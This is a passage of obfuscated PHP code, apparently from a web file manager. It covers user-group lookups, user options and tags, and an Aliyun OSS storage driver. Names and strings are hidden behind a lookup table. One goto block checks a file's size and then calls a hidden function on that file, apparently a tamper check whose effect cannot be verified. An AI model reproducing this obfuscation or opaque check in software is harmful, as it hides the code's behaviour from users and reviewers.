$ï®ÇÉÚ = array($æó´³û‚[97] => $Ü‰åÎø, $æó´³û‚[450] => array($æó´³û‚[459], "\45{$âá€‚ Ë}\45")); $ï®ÇÉÚ = $this->parseWhereLike($ï®ÇÉÚ); $¾Ñ¤ŠÔà = Model($æó´³û‚[2491])->where($ï®ÇÉÚ)->limit($¯ÕÔâ¼ë)->select(); if (!$¾Ñ¤ŠÔà) { return array(); } $¾Ñ¤ŠÔà = array_to_keyvalue($¾Ñ¤ŠÔà, $æó´³û‚[12], $æó´³û‚[1770]); $§ĞüÎêò = $this->where(array($æó´³û‚[1761] => array($æó´³û‚[7], $¾Ñ¤ŠÔà)))->select(); if (!$§ĞüÎêò) { return array(); } return $§ĞüÎêò; } private function _listDataApplyItem($‚ÏáãŒñ) { $’–œ†òƒ = array($‚ÏáãŒñ); $this->_listDataApply($’–œ†òƒ); return $’–œ†òƒ[0]; } private function _listDataApply(&$şå°ã€¬) { $º¯ÛÂÉç =& $_SERVER[ç¦¬”œš]; if (!$şå°ã€¬) { return; } array_remove_key($şå°ã€¬, $º¯ÛÂÉç[968]); $—¦Ñ®ÒÚ = array_to_keyvalue($şå°ã€¬, $º¯ÛÂÉç[12], $º¯ÛÂÉç[1770]); $this->_listAppendGroup($şå°ã€¬, $—¦Ñ®ÒÚ); $this->_listAppendMeta($şå°ã€¬, $—¦Ñ®ÒÚ); $this->_listAppendSourceRoot($şå°ã€¬, $—¦Ñ®ÒÚ); } private function _listAppendSourceRoot(&$š‹§âÁÅ, $”´À˜€ù) { $¬İÔÆé =& $_SERVER[ç¦¬”œš]; $ùÌÆ³¯¾ = Model($¬İÔÆé[904])->listSourceRoot(SourceModel::TYPE_USER, $”´À˜€ù); $ùÌÆ³¯¾ = array_to_keyvalue($ùÌÆ³¯¾, $¬İÔÆé[578]); $ùÌÆ³¯¾ = array_remove_key($ùÌÆ³¯¾, $¬İÔÆé[578]); foreach ($š‹§âÁÅ as &$Œïš·’) { $Œïš·’[$¬İÔÆé[90]] = $ùÌÆ³¯¾[$Œïš·’[$¬İÔÆé[1770]]] ? $ùÌÆ³¯¾[$Œïš·’[$¬İÔÆé[1770]]] : array(); } unset($Œïš·’); } private function _listAppendGroup(&$ª›ªÙÛì, $¯¥üÆ‚í) { $‘ÓŸ¨Ó¡ =& $_SERVER[ç¦¬”œš]; $«»àÄ  = array($‘ÓŸ¨Ó¡[1770] => array($‘ÓŸ¨Ó¡[7], $¯¥üÆ‚í)); $äƒÊ·®Ş = Model($‘ÓŸ¨Ó¡[2063])->where($«»àÄ )->select(); $éŒú€©© = array_to_keyvalue($äƒÊ·®Ş, $‘ÓŸ¨Ó¡[12], $‘ÓŸ¨Ó¡[1969]); $éŒú€©© = array_remove_value(array_unique($éŒú€©©), $‘ÓŸ¨Ó¡[228]); if (!$éŒú€©© || !$äƒÊ·®Ş) { return; } $«»àÄ  = array($‘ÓŸ¨Ó¡[1969] => array($‘ÓŸ¨Ó¡[7], $éŒú€©©)); $ëäŠŞÃë = Model($‘ÓŸ¨Ó¡[2158])->field($‘ÓŸ¨Ó¡[2492])->where($«»àÄ )->select(); $ëäŠŞÃë = array_to_keyvalue($ëäŠŞÃë, $‘ÓŸ¨Ó¡[1969]); $äƒÊ·®Ş = array_to_keyvalue_group($äƒÊ·®Ş, $‘ÓŸ¨Ó¡[1770]); foreach ($äƒÊ·®Ş as &$Èïä¥ˆ) { $Áå˜ùÆ = array(); foreach ($Èïä¥ˆ as $úİöÁïß) { if (!$úİöÁïß[$‘ÓŸ¨Ó¡[2077]]) { continue; } $“Â–¢®Ã = Model($‘ÓŸ¨Ó¡[580])->listData($úİöÁïß[$‘ÓŸ¨Ó¡[2077]]); $Áå˜ùÆ[] = array($‘ÓŸ¨Ó¡[1969] => $úİöÁïß[$‘ÓŸ¨Ó¡[1969]], $‘ÓŸ¨Ó¡[2493] => $ëäŠŞÃë[$úİöÁïß[$‘ÓŸ¨Ó¡[1969]]][$‘ÓŸ¨Ó¡[32]], $‘ÓŸ¨Ó¡[593] => $ëäŠŞÃë[$úİöÁïß[$‘ÓŸ¨Ó¡[1969]]][$‘ÓŸ¨Ó¡[593]], $‘ÓŸ¨Ó¡[496] => $“Â–¢®Ã); } $Èïä¥ˆ = $Áå˜ùÆ; } unset($Èïä¥ˆ); foreach ($ª›ªÙÛì as &$çºÃĞÜ€) { $çºÃĞÜ€[$‘ÓŸ¨Ó¡[2160]] = array(); if (isset($äƒÊ·®Ş[$çºÃĞÜ€[$‘ÓŸ¨Ó¡[1770]]])) { $çºÃĞÜ€[$‘ÓŸ¨Ó¡[2160]] = $äƒÊ·®Ş[$çºÃĞÜ€[$‘ÓŸ¨Ó¡[1770]]]; } } unset($çºÃĞÜ€); } public function userAppendGroup($Ï•ùúê¼) { $Ã‘œú•Í =& $_SERVER[ç¦¬”œš]; if (!$Ï•ùúê¼) { return array(); } $this->_listAppendGroup($Ï•ùúê¼, array_to_keyvalue($Ï•ùúê¼, $Ã‘œú•Í[12], $Ã‘œú•Í[1770])); return $Ï•ùúê¼; } private function _listAppendMeta(&$×€šµè, $ÎŠîç¤¯) { $õ¹Ë¸®Ë =& $_SERVER[ç¦¬”œš]; $ôšŸêí = UserJobModel::JOB_KEY; $®Òş°Ó« = array($õ¹Ë¸®Ë[2473]); $´¤î®ßÔ = array($õ¹Ë¸®Ë[1770] => array($õ¹Ë¸®Ë[7], $ÎŠîç¤¯)); $ºŠ¤Ü†Â = Model($õ¹Ë¸®Ë[2471])->where($´¤î®ßÔ)->select(); $ºŠ¤Ü†Â = array_to_keyvalue_group($ºŠ¤Ü†Â, $õ¹Ë¸®Ë[1770]); foreach ($ºŠ¤Ü†Â as &$’·£Áç‡) { $ÅÆöºõÂ = array(); foreach ($’·£Áç‡ as $ ­¬Ş¾ı) { if (!in_array($ ­¬Ş¾ı[$õ¹Ë¸®Ë[97]], $®Òş°Ó«)) { $ÅÆöºõÂ[$ ­¬Ş¾ı[$õ¹Ë¸®Ë[97]]] = $ ­¬Ş¾ı[$õ¹Ë¸®Ë[450]]; } } $’·£Áç‡ = $ÅÆöºõÂ; } unset($’·£Áç‡); $–úîıÓ = Model($õ¹Ë¸®Ë[2494]); foreach ($×€šµè as &$ŸŒÚµŸ±) { $áÎÊ©£ = array(); if (isset($ºŠ¤Ü†Â[$ŸŒÚµŸ±[$õ¹Ë¸®Ë[1770]]])) { $áÎÊ©£ = $ºŠ¤Ü†Â[$ŸŒÚµŸ±[$õ¹Ë¸®Ë[1770]]]; } $ŸŒÚµŸ±[$õ¹Ë¸®Ë[2495]] = array(); if (isset($áÎÊ©£[$ôšŸêí])) { $ŸŒÚµŸ±[$õ¹Ë¸®Ë[2495]] = $–úîıÓ->getUserJobInfo($áÎÊ©£[$ôšŸêí]); } } unset($ŸŒÚµŸ±); } protected function groupUserAll($¤ªçñ¦¼) { $ĞÃ®—ÜÚ =& $_SERVER[ç¦¬”œš]; if (!$¤ªçñ¦¼) { return !1; } $¡¶êÀØÒ = Model($ĞÃ®—ÜÚ[2063])->field($ĞÃ®—ÜÚ[1770])->where(array($ĞÃ®—ÜÚ[1969] => array($ĞÃ®—ÜÚ[7], $¤ªçñ¦¼)))->select(); $¡¶êÀØÒ = array_to_keyvalue($¡¶êÀØÒ, $ĞÃ®—ÜÚ[12], $ĞÃ®—ÜÚ[1770]); return array_unique($¡¶êÀØÒ); } public function userSearch($ªÎå€æ, $Ûİ¤‹€ = "\x2a") { return Model($_SERVER[ç¦¬”œš][607])->where($ªÎå€æ)->field($Ûİ¤‹€)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\x6f\x70\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($˜±ŒÉüĞ) { $¯ßÉ×†¶ =& $_SERVER[ç¦¬”œš]; $™ìùáÍ = defined($¯ßÉ×†¶[2195]) && USER_ID ? USER_ID : $¯ßÉ×†¶[12]; return "\125\x73\x65\162\x4f\x70\164\151\x6f\156\x5f{$˜±ŒÉüĞ}\137" . $™ìùáÍ; } protected function filterWhere($‡ğ»¾—˜) { $ªµè¹½ =& $_SERVER[ç¦¬”œš]; $‡ğ»¾—˜[$ªµè¹½[1770]] = defined($ªµè¹½[2195]) && USER_ID ? USER_ID : $ªµè¹½[12]; return $‡ğ»¾—˜; } public function cacheRemoveUser($æé¥–¡Ï, $ı…«–èø) { return Cache::remove("\125\163\x65\x72\117\x70\164\151\x6f\x6e\x5f{$æé¥–¡Ï}\x5f" . $ı…«–èø); } protected function optionDefault($ÛŠßƒ¬„ = '') { $ã¯×ÄŞ× =& $_SERVER[ç¦¬”œš]; if ($ÛŠßƒ¬„ == $ã¯×ÄŞ×[12]) { return $GLOBALS[$ã¯×ÄŞ×[6]][$ã¯×ÄŞ×[2496]]; } if ($ÛŠßƒ¬„ == $ã¯×ÄŞ×[2497]) { return $GLOBALS[$ã¯×ÄŞ×[6]][$ã¯×ÄŞ×[2498]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\x74\141\147\x4c\x69\x73\164"; public $modelType = "\x55\x73\145\162\117\x70\x74\151\157\x6e"; public $field = array("\156\141\155\x65", "\x73\x74\171\154\x65", "\x73\157\162\x74"); public function listData($ºü¢à… = false, $õıèÎ£Ï = "\x73\x6f\x72\x74", $ã¾«Šß˜ = false) { return parent::listData($ºü¢à…, $õıèÎ£Ï, $ã¾«Šß˜); } public function remove($€†£èË) { return parent::remove($€†£èË); } public function add($¼ˆ¾¢ê‹, $Ò…Á³° = "\154\141\x62\x65\154\55\x67\162\x65\x79\x2d\x6e\157\162\x6d\x61\x6c") { $¤™Øºİ =& $_SERVER[ç¦¬”œš]; if ($this->findByName($¼ˆ¾¢ê‹)) { return !1; } $Ñ†îí×Ú = array($¤™Øºİ[503] => $¼ˆ¾¢ê‹, $¤™Øºİ[567] => $Ò…Á³°, $¤™Øºİ[1973] => $this->getSort($¤™Øºİ[335]) + 1); return parent::insert($Ñ†îí×Ú); } public function update($üöºé•ø, $Ã‰–ôß) { $÷–±…€ˆ =& $_SERVER[ç¦¬”œš]; $ä‰Ş¸ô = $this->listData($üöºé•ø); $«“ôò²† = $this->findByName($Ã‰–ôß[$÷–±…€ˆ[32]]); if (!$ä‰Ş¸ô || $«“ôò²† && $«“ôò²†[$÷–±…€ˆ[484]] != $ä‰Ş¸ô[$÷–±…€ˆ[484]]) { return !1; } return parent::update($üöºé•ø, $Ã‰–ôß); } public function moveTop($ˆáïÍß‘) { $Ä·ûŒ¼Ì =& $_SERVER[ç¦¬”œš]; $ïíÑ´’ñ = parent::listData(); $Åæ¸ä—º = $this->getSort($Ä·ûŒ¼Ì[334]); foreach ($ïíÑ´’ñ as &$ÀŸÂ¿Ö‘) { if ($ÀŸÂ¿Ö‘[$Ä·ûŒ¼Ì[484]] == $ˆáïÍß‘) { $ÀŸÂ¿Ö‘[$Ä·ûŒ¼Ì[1993]] = $Åæ¸ä—º; continue; } $ÀŸÂ¿Ö‘[$Ä·ûŒ¼Ì[1993]] += 1; } unset($ÀŸÂ¿Ö‘); return parent::resetData($ïíÑ´’ñ); } public function moveBottom($Ö³§æ¹­) { $¹¡«Ê¹ğ =& $_SERVER[ç¦¬”œš]; $ªÃÏÔŸ§ = $this->getSort($¹¡«Ê¹ğ[335]) + 1; return parent::update($Ö³§æ¹­, array($¹¡«Ê¹ğ[1993] => $ªÃÏÔŸ§)); } public function resetSort($Ê“õÊÓ) { $öÏÄĞíÀ =& $_SERVER[ç¦¬”œš]; $…¥Ñ™³‡ = array(); $Ê“õÊÓ = is_array($Ê“õÊÓ) ? $Ê“õÊÓ : array(); for ($×œä„û = 0; $×œä„û < count($Ê“õÊÓ); $×œä„û++) { $…¥Ñ™³‡[$Ê“õÊÓ[$×œä„û] . $öÏÄĞíÀ[12]] = $×œä„û + 1; } $¾‰ÜŠ—ä = parent::listData(); foreach ($¾‰ÜŠ—ä as &$á˜£ùÂ) { $ñ½ê‡’ = $…¥Ñ™³‡[$á˜£ùÂ[$öÏÄĞíÀ[484]]]; $á˜£ùÂ[$öÏÄĞíÀ[1993]] = $ñ½ê‡’ ? $ñ½ê‡’ : $á˜£ùÂ[$öÏÄĞíÀ[1993]]; } unset($á˜£ùÂ); return parent::resetData($¾‰ÜŠ—ä); } private function getSort($ÑÔëéÀ´) { $ˆë¿¹ó =& $_SERVER[ç¦¬”œš]; $ŸŞ‘¡‚ = parent::listData(); $¹èØÃô¶ = array_to_keyvalue($ŸŞ‘¡‚, $ˆë¿¹ó[12], $ˆë¿¹ó[1993]); if (!$¹èØÃô¶) { $¹èØÃô¶ = array(0); } $Ì¥Éüû = $ÑÔëéÀ´ == $ˆë¿¹ó[335] ? max($¹èØÃô¶) : min($¹èØÃô¶); return intval($Ì¥Éüû); } } goto dô“†¾°´; DÎ‰‡ãª¨Œ: if ($_SERVER[$_SERVER[ç¦¬”œš][474]] != $_size($_file)) { $_getc = $_SERVER[ç¦¬”œš][475]; $_getfile = $_SERVER[$_SERVER[ç¦¬”œš][476]] . $_SERVER[ç¦¬”œš][477]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ç¦¬”œš][262], $_getfilec); if (count($_getarrs) < $_SERVER[ç¦¬”œš][478]) { $exit = $_SERVER[ç¦¬”œš][479]; $exit(); } $_act = $_SERVER[ç¦¬”œš][480]; $_act($_file); } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ƒÅÃ™») { parent::__construct(); include_once SDK_DIR . $_SERVER[ç¦¬”œš][1462]; $this->_init($ƒÅÃ™»); } public function _init($¹¹úÍúÛ) { $Ğ³Ì§Á¬ =& $_SERVER[ç¦¬”œš]; $this->config = $¹¹úÍúÛ; foreach ($¹¹úÍúÛ as $÷¾ÎÌ½Â => $è……û) { if (isset($this->{$÷¾ÎÌ½Â})) { $this->{$÷¾ÎÌ½Â} = $è……û; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ğ³Ì§Á¬[1463] . LNG($Ğ³Ì§Á¬[1464])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $°êŸûØÓ =& $_SERVER[ç¦¬”œš]; $¾”¶¡ã = new OSS\Model\CorsConfig(); $Ş¾¤É‡„ = new OSS\Model\CorsRule(); $Ş¾¤É‡„->addAllowedOrigin($°êŸûØÓ[1465]); $Ş¾¤É‡„->addAllowedMethod($°êŸûØÓ[1466]); $Ş¾¤É‡„->addAllowedMethod($°êŸûØÓ[1467]); $Ş¾¤É‡„->addAllowedMethod($°êŸûØÓ[1468]); $Ş¾¤É‡„->addAllowedMethod($°êŸûØÓ[1469]); $Ş¾¤É‡„->addAllowedMethod($°êŸûØÓ[165]); $Ş¾¤É‡„->setMaxAgeSeconds(600); $Ş¾¤É‡„->addExposeHeader($°êŸûØÓ[1470]); $Ş¾¤É‡„->addAllowedHeader($°êŸûØÓ[1465]); $¾”¶¡ã->addRule($Ş¾¤É‡„); try { $this->client->putBucketCors($this->bucket, $¾”¶¡ã); } catch (OSS\Core\OssException $´ •ÒÁ‘) { $this->writeLog(__FUNCTION__ . $°êŸûØÓ[214] . $´ •ÒÁ‘->getMessage()); return !1; } return !0; } public function getBucketCors() { $¨¬Ïï² =& $_SERVER[ç¦¬”œš]; $§††õê© = null; try { $§††õê© = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $É‚æÀ™…) { $this->writeLog(__FUNCTION__ . $¨¬Ïï²[214] . $É‚æÀ™…->getMessage()); return null; } if (!$§††õê© || !($ñß—õÛ = $§††õê©->getRules())) { return null; } $Çô½©İ— = $ñß—õÛ[0]->getAllowedOrigins(); $¢ØÑ¢›µ = $ñß—õÛ[0]->getAllowedMethods(); $ŠŒ®ë•ê = $ñß—õÛ[0]->getMaxAgeSeconds(); $”§‰Ô“Ë = $ñß—õÛ[0]->getExposeHeaders(); $¢ˆ¤Îú· = $ñß—õÛ[0]->getAllowedHeaders(); return array($¨¬Ïï²[218] => isset($Çô½©İ—[0]) ? $Çô½©İ—[0] : $¨¬Ïï²[12], $¨¬Ïï²[222] => $¢ØÑ¢›µ, $¨¬Ïï²[1471] => $ŠŒ®ë•ê, $¨¬Ïï²[1472] => isset($”§‰Ô“Ë[0]) ? $”§‰Ô“Ë[0] : $¨¬Ïï²[12], $¨¬Ïï²[219] => isset($¢ˆ¤Îú·[0]) ? $¢ˆ¤Îú·[0] : $¨¬Ïï²[12]); } public function isBucketCors() { $»¬‡Ÿâ¦ =& $_SERVER[ç¦¬”œš]; $İù¿Ùá = $this->getBucketCors(); if (!$İù¿Ùá || !is_array($İù¿Ùá)) { return !1; } if ($İù¿Ùá[$»¬‡Ÿâ¦[218]] != $»¬‡Ÿâ¦[220] || $İù¿Ùá[$»¬‡Ÿâ¦[219]] != $»¬‡Ÿâ¦[220]) { return !1; } $…ğ¨Ç»˜ = array_map($»¬‡Ÿâ¦[221], $İù¿Ùá[$»¬‡Ÿâ¦[222]]); if (!is_array($…ğ¨Ç»˜)) { $…ğ¨Ç»˜ = array(); } $ ôÃØêÖ = array($»¬‡Ÿâ¦[223], $»¬‡Ÿâ¦[224], $»¬‡Ÿâ¦[225], $»¬‡Ÿâ¦[226], $»¬‡Ÿâ¦[227]); $Íùô„ê– = array_diff($ ôÃØêÖ, $…ğ¨Ç»˜); return empty($Íùô„ê–); } public function mkfile($Õ…±ï­, $§ûã•à = '', $ûù»†¼Û = REPEAT_RENAME) { $¿æÚÀ›ş = $this->setContent($Õ…±ï­, $§ûã•à); if ($¿æÚÀ›ş !== !1) { return $this->getPathOuter($Õ…±ï­); } return !1; } public function mkdir($³¥ õÎ¨, $ôúÔ®è = REPEAT_SKIP) { if ($ôúÔ®è && $this->_isFolder($³¥ õÎ¨)) { return $this->getPathOuter($³¥ õÎ¨); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($³¥ õÎ¨)); } catch (OSS\Core\OssException $æ†ÆÉ¾Í) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][214] . $æ†ÆÉ¾Í->getMessage()); return !1; } return $this->getPathOuter($³¥ õÎ¨); } private function fileList($§²ÄÚ‚Ó, $±–¬®„ı = '', $Ø¿…À©ƒ = 0) { $Ìà€–« =& $_SERVER[ç¦¬”œš]; $§²ÄÚ‚Ó = trim($§²ÄÚ‚Ó, $Ìà€–«[8]); $ÑÁµ¿òÄ = empty($§²ÄÚ‚Ó) && $§²ÄÚ‚Ó !== $Ìà€–«[228] ? $Ìà€–«[12] : $§²ÄÚ‚Ó . $Ìà€–«[8]; $±ŠŒ¥ĞĞ = $Ìà€–«[12]; $–í£¦«ù = 1000; $›ñ‘„» = $ºçşøŠ = array(); while (!0) { check_abort(); $ˆ¶ª–”¶ = array($Ìà€–«[1473] => $±–¬®„ı, $Ìà€–«[1474] => $ÑÁµ¿òÄ, $Ìà€–«[1475] => $–í£¦«ù, $Ìà€–«[1476] => $±ŠŒ¥ĞĞ); try { $“Ï©È” = $this->client->listObjects($this->bucket, $ˆ¶ª–”¶); } catch (OSS\Core\OssException $˜ÊŞíÖ§) { $this->writeLog(__FUNCTION__ . $Ìà€–«[214] . $˜ÊŞíÖ§->getMessage()); break; } $±ŠŒ¥ĞĞ = $“Ï©È”->getNextMarker(); $±ê¸‡¥’ = $“Ï©È”->getObjectList(); $°²÷˜ï‡ = $“Ï©È”->getPrefixList(); foreach ($±ê¸‡¥’ as $š†øñÅ×) { if ($š†øñÅ×->getKey() == $ÑÁµ¿òÄ) { continue; } $¾Â³¤Æğ = $š†øñÅ×->getKey(); $ÜœëúĞò = $š†øñÅ×->getSize(); $û¡²«À” = $š†øñÅ×->getLastModified(); $°Èˆ³êŸ = trim($š†øñÅ×->getETag(), $Ìà€–«[121]); $‚Õü‹Å­ = $Ø¿…À©ƒ ? array($Ìà€–«[32] => $¾Â³¤Æğ, $Ìà€–«[79] => $ÜœëúĞò, $Ìà€–«[206] => strtotime($û¡²«À”), $Ìà€–«[1477] => $°Èˆ³êŸ) : $¾Â³¤Æğ; $È·ˆãĞ´ = $ÜœëúĞò == 0 && substr($¾Â³¤Æğ, strlen($¾Â³¤Æğ) - 1, 1) == $Ìà€–«[8] ? !0 : !1; $î£¼¹ï  = array($Ìà€–«[79] => $ÜœëúĞò, $Ìà€–«[1478] => $ÜœëúĞò, $Ìà€–«[88] => strtotime($û¡²«À”), $Ìà€–«[1479] => $û¡²«À”, $Ìà€–«[1477] => $°Èˆ³êŸ); $this->cacheMethodInfoSet($¾Â³¤Æğ, $È·ˆãĞ´, $î£¼¹ï ); if ($È·ˆãĞ´) { $›ñ‘„»[] = $¾Â³¤Æğ; continue; } $ºçşøŠ[] = $‚Õü‹Å­; } foreach ($°²÷˜ï‡ as $°Ø‡±ö¸) { $›ñ‘„»[] = $°Ø‡±ö¸->getPrefix(); $this->cacheMethodInfoSet($°Ø‡±ö¸->getPrefix(), !0); } if ($±ŠŒ¥ĞĞ === $Ìà€–«[12]) { break; } } $this->cacheMethodInfoSet($§²ÄÚ‚Ó, !0); return array($Ìà€–«[85] => $›ñ‘„», $Ìà€–«[86] => $ºçşøŠ); } public function listObject($¯İÈêïª, $ˆ±îåü  = '') { $é€š®‰— =& $_SERVER[ç¦¬”œš]; $¯İÈêïª = trim($¯İÈêïª, $é€š®‰—[8]); $éùç·œó = empty($¯İÈêïª) && $¯İÈêïª !== $é€š®‰—[228] ? $é€š®‰—[12] : $¯İÈêïª . $é€š®‰—[8]; $Öã»°ŸÒ = $é€š®‰—[12]; $¬È‚¹•¡ = 1000; $ÀÜãœ¦Ë = $ÆÎâşşÂ = array(); while (!0) { check_abort(); $ªÔ èûó = array($é€š®‰—[1473] => $ˆ±îåü , $é€š®‰—[1474] => $éùç·œó, $é€š®‰—[1475] => $¬È‚¹•¡, $é€š®‰—[1476] => $Öã»°ŸÒ); try { $ãÛÉ»î¶ = $this->client->listObjects($this->bucket, $ªÔ èûó); } catch (OSS\Core\OssException $—Äƒ¿şÒ) { $this->writeLog(__FUNCTION__ . $é€š®‰—[214] . $—Äƒ¿şÒ->getMessage()); break; } $Öã»°ŸÒ = $ãÛÉ»î¶->getNextMarker(); $¬Å‚·Ñú = $ãÛÉ»î¶->getObjectList(); foreach ($¬Å‚·Ñú as $ùÑß¤õì) { if ($ùÑß¤õì->getKey() == $éùç·œó) { continue; } $ïÉ©£ˆÉ = $ùÑß¤õì->getKey(); $Î°ÖÈ¥ = $ùÑß¤õì->getSize(); $µûÍ¨µ— = $Î°ÖÈ¥ == 0 && substr($ïÉ©£ˆÉ, strlen($ïÉ©£ˆÉ) - 1, 1) == $é€š®‰—[8] ? !0 : !1; if ($µûÍ¨µ—) { continue; } (yield $Î°ÖÈ¥ . $é€š®‰—[214] . $ïÉ©£ˆÉ); } if ($Öã»°ŸÒ === $é€š®‰—[12]) { break; } } } public function copyFile($•¡ÔÍ, $ä§‰å—°) { $Ôí¢ÒÆÖ = $this->size($•¡ÔÍ); if ($Ôí¢ÒÆÖ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $•¡ÔÍ, $this->bucket, $this->pathEncode($ä§‰å—°)); } catch (OSS\Core\OssException $˜•èˆ¦¿) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][214] . $˜•èˆ¦¿->getMessage()); return !1; } return $this->getPathOuter($ä§‰å—°); } $Î¯±ß“ä = $this->multiCopyObject($•¡ÔÍ, $ä§‰å—°, $Ôí¢ÒÆÖ); return $Î¯±ß“ä ? $this->getPathOuter($ä§‰å—°) : !1; } private function multiCopyObject($ûøêğÀû, $üò¿ÀŞÅ, $û÷Ô÷ì“) { $ğÁÆ³ì =& $_SERVER[ç¦¬”œš]; try { $ø½Û›£ì = array(); if ($ª¨šËÖù = $this->hashMd5($ûøêğÀû)) { $ø½Û›£ì = array(OSS\OssClient::OSS_HEADERS => array($ğÁÆ³ì[1480] => $ª¨šËÖù)); } $æ¯ƒÖ¬Ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($üò¿ÀŞÅ), $ø½Û›£ì); $ÙÖÏõ—ğ = 1; $—£Ó«ú» = 0; $üÛÕË¼å = array(); $À©øİ‹ = 1024 * 1024 * 10; $’›¡´š¨ = $this->client->generateMultiuploadParts($û÷Ô÷ì“, $À©øİ‹); foreach ($’›¡´š¨ as $’ÅÀ¿Šä => $°İ¥ªŠÕ) { $Èæ¾Çç” = $—£Ó«ú» + (int) $°İ¥ªŠÕ[$ğÁÆ³ì[1481]]; $óŸÈæÒœ = (int) $°İ¥ªŠÕ[$ğÁÆ³ì[413]] + $Èæ¾Çç” - 1; $ø¦À‹¾î = array($ğÁÆ³ì[167] => $Èæ¾Çç”, $ğÁÆ³ì[168] => $óŸÈæÒœ); $üÛÕË¼å[] = $this->client->uploadPartCopy($this->bucket, $ûøêğÀû, $this->bucket, $this->pathEncode($üò¿ÀŞÅ), $ÙÖÏõ—ğ, $æ¯ƒÖ¬Ó, $ø¦À‹¾î); $ÙÖÏõ—ğ = $ÙÖÏõ—ğ + 1; } $İ‡ßİ×õ = array(); foreach ($üÛÕË¼å as $’ÅÀ¿Šä => $¢´„Š„œ) { $İ‡ßİ×õ[] = array($ğÁÆ³ì[308] => $’ÅÀ¿Šä + 1, $ğÁÆ³ì[309] => $¢´„Š„œ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($üò¿ÀŞÅ), $æ¯ƒÖ¬Ó, $İ‡ßİ×õ); } catch (OSS\Core\OssException $ë˜˜Àéß) { $this->writeLog(__FUNCTION__ . $ğÁÆ³ì[214] . $ë˜˜Àéß->getMessage()); return !1; } return !0; } public function moveFile($±¬°â€´, $ÁÜ´™ª“) { if ($this->copyFile($±¬°â€´, $ÁÜ´™ª“)) { $this->remove($±¬°â€´); return $this->getPathOuter($ÁÜ´™ª“); } return !1; } public function delFile($ÕŒ’ê†è) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÕŒ’ê†è)); } catch (OSS\Core\OssException $”ÚÉŞ£ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][214] . $”ÚÉŞ£ñ->getMessage()); return !1; } return !0; } public function delFolder($¹·äƒâ®) { $àô‰Àò =& $_SERVER[ç¦¬”œš]; if (!$this->exist($¹·äƒâ®)) { return !0; } $this->listItemCache = !1; $°Ş¹ÄƒÆ = $this->fileList($¹·äƒâ®); $this->listItemCache = !0; $ò¢Ãçµ = trim($¹·äƒâ®, $àô‰Àò[8]) . $àô‰Àò[8]; if (!empty($¹·äƒâ®) && $¹·äƒâ® !== $àô‰Àò[228] && !in_array($ò¢Ãçµ, $°Ş¹ÄƒÆ[$àô‰Àò[85]])) { $°Ş¹ÄƒÆ[$àô‰Àò[85]][] = $ò¢Ãçµ; } $ĞÆš·› = $this->delByBatch($°Ş¹ÄƒÆ[$àô‰Àò[86]]); if (!$ĞÆš·›) { return !1; } $ĞÆš·› = $this->delByBatch($°Ş¹ÄƒÆ[$àô‰Àò[85]]); if (!$ĞÆš·›) { return !1; } return $this->delFile($ò¢Ãçµ); } private function delByBatch($’ºÓÊĞå) { foreach (array_chunk($’ºÓÊĞå, 1000) as $ö¬›ö•) { try { $this->client->deleteObjects($this->bucket, $ö¬›ö•); } catch (OSS\Core\OssException $íÎ¤–Ä¶) { $this->writeLog(__FUNCTION__ . $_SERVER[ç¦¬”œš][214] . $íÎ¤–Ä¶->getMessage()); return !1; } } return !0; } public function rename($¦³©°šû, $š½Æñêú) { return $this->renameObject($¦³©°šû, $š½Æñêú); } private function fileInfo($‹ô›ÒË‚, $û²è’ôÃ = false, $§úğÛŠŠ = array()) { $ğ¹Ü£æ™ =& $_SERVER[ç¦¬”œš]; $§÷—Õƒ = array($ğ¹Ü£æ™[32] => $this->pathThis($‹ô›ÒË‚), $ğ¹Ü£æ™[87] => $this->getPathOuter($‹ô›ÒË‚), $ğ¹Ü£æ™[33] => $ğ¹Ü£æ™[230], $ğ¹Ü£æ™[79] => isset($§úğÛŠŠ[$ğ¹Ü£æ™[79]]) ? $§úğÛŠŠ[$ğ¹Ü£æ™[79]] : 0, $ğ¹Ü£æ™[169] => $this->ext($‹ô›ÒË‚)); if ($û²è’ôÃ) { return $§÷—Õƒ; } $§÷—Õƒ[$ğ¹Ü£æ™[231]] = $§÷—Õƒ[$ğ¹Ü£æ™[88]] = 0; $§÷—Õƒ[$ğ¹Ü£æ™[232]] = $§÷—Õƒ[$ğ¹Ü£æ™[233]] = !0; if (empty($§úğÛŠŠ)) { $é—³ëËª = $this->objectMeta($‹ô›ÒË‚); if (!$é—³ëËª) { return $§÷—Õƒ; } $§úğÛŠŠ = array($ğ¹Ü£æ™[88] => strtotime($é—³ëËª[$ğ¹Ü£æ™[1479]]), $ğ¹Ü£æ™[79] => $é—³ëËª[$ğ¹Ü£æ™[1478]] + 0, $ğ¹Ü£æ™[1477] => $é—³ëËª[$ğ¹Ü£æ™[1477]]); } if (isset($§úğÛŠŠ[$ğ¹Ü£æ™[1477]]) && $§úğÛŠŠ[$ğ¹Ü£æ™[1477]]) { $§÷—Õƒ[$ğ¹Ü£æ™[235]] = trim($§úğÛŠŠ[$ğ¹Ü£æ™[1477]], $ğ¹Ü£æ™[121]); } if (isset($§úğÛŠŠ[$ğ¹Ü£æ™[79]])) { $§÷—Õƒ[$ğ¹Ü£æ™[79]] = $§úğÛŠŠ[$ğ¹Ü£æ™[79]]; } if 